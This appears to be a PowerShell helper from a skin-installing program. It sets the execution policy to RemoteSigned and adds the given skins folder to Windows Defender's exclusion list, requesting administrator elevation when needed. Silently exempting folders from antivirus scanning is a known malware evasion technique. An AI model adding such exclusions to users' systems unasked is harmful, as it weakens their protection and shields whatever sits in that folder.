$skinspath=$args[0]
$programpath=$args[1]

$folderPath = "$skinspath"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

Set-ExecutionPolicy RemoteSigned -Force
	
if (-not $isAdmin) {
	$startInfo = New-Object System.Diagnostics.ProcessStartInfo
	$startInfo.FileName = 'powershell.exe'
	$startInfo.Arguments = "-Command `"Add-MpPreference -ExclusionPath '$folderPath'`""
	$startInfo.Verb = "runas"
[System.Diagnostics.Process]::Start($startInfo) | Out-Null
} else {
	Add-MpPreference -ExclusionPath $folderPath
}